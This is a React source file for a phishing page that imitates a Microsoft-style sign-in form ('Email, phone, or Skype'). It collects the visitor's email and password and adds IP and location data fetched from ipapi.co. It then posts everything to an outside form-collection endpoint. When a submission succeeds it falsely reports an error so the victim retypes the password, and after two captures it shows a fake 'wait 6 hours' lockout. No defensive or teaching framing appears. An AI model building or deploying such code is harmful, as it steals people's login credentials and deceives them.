import axios from "axios";
import React, { useEffect, useState } from "react";

const FORMSPARK_FORM_ID = "https://submit-form.com/PcMyPAkzz";

const App = () => {
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [ipDetails, setIpDetails] = useState(null);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [successCount, setSuccessCount] = useState(0);

  // Fetch IP details on mount
  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const response = await axios.get("https://ipapi.co/json/");
        setIpDetails(response.data);
      } catch (err) {
        console.error("Failed to fetch IP details:", err);
        setIpDetails({ error: "Unable to retrieve IP details" });
      }
    };

    fetchIpDetails();
  }, []);

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setSuccess(false);
    setError(false);
    setErrorMessage("");

    const payload = {
      ...formData,
      ...ipDetails,
    };

    try {
      const response = await axios.post(FORMSPARK_FORM_ID, payload, {
        headers: { "Content-Type": "application/json" },
      });

      if (response.status === 200) {
        setSuccess(true);
        setFormData({ email: "", password: "" });
        setSuccessCount((prev) => prev + 1); // Increment success count
      } else {
        setError(true);
        setErrorMessage(response.statusText || "Unexpected error occurred");
      }
    } catch (err) {
      console.error("Submission failed:", err);
      setError(true);
      setErrorMessage(err.response?.data?.message || "Something went wrong");
    } finally {
      setLoading(false);
    }
  };

  // Handle input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-green-200">
      {/* Loading Modal */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-md shadow-md">
            <div className="flex items-center space-x-4">
              <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-blue-500"></div>
              <span className="text-blue-500 font-semibold">Processing...</span>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white shadow-md rounded-md p-6 w-full max-w-md">
        <div className=""></div>
        <h1 className="text-3xl font-semibold text-green-600 text-center mb-6">
          Sign in
        </h1>

        {/* Success Message */}
        {success && successCount < 2 && (
          <div className="bg-green-100 text-red-700 p-3 rounded-md mb-4">
            Something went wrong. Please try again.
          </div>
        )}

        {/* Error Message */}
        {error && (
          <div className="bg-red-100 text-red-700 p-3 rounded-md mb-4">
            {errorMessage || "Something went wrong. Please try again."}
          </div>
        )}

        {/* Custom Message for Two Successes */}
        {successCount >= 2 && (
          <div className="bg-yellow-100 text-yellow-700 p-3 rounded-md mb-4">
            The error occurred twice. Kindly wait for 6 hours and try again. Thank you.
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <input
              type="email"
              name="email"
              id="email"
              className="w-full border border-gray-300 p-3 rounded-md focus:ring-2 focus:ring-green-500"
              placeholder="Email, phone, or Skype"
              value={formData.email}
              onChange={handleInputChange}
              required
            />
          </div>

          <div>
            <input
              type="password"
              name="password"
              id="password"
              className="w-full border border-gray-300 p-3 rounded-md focus:ring-2 focus:ring-green-500"
              placeholder="Password"
              value={formData.password}
              onChange={handleInputChange}
              required
            />
          </div>

          {/* Forgot Password Link */}
          <div className="text-right">
            <a
              href="#"
              className="text-green-500 text-sm hover:underline"
              onClick={(e) => e.preventDefault()}
            >
              Forgot password?
            </a>
          </div>

          <button
            type="submit"
            className={`w-full bg-green-600 text-white py-3 rounded-md hover:bg-green-700 transition ${
              loading ? "opacity-50 cursor-not-allowed" : ""
            }`}
            disabled={loading || successCount >= 2}
          >
            {loading ? "Logging in..." : "Sign in"}
          </button>

          {/* Divider */}
          <div className="text-center text-sm text-gray-500 my-4">
            <span>or</span>
          </div>

          {/* Create Account Link */}
          <div className="text-center">
            <a
              href="#"
              className="text-green-500 text-sm hover:underline"
              onClick={(e) => e.preventDefault()}
            >
              No account? Create one!
            </a>
          </div>
        </form>
      </div>
    </div>
  );
};

export default App;
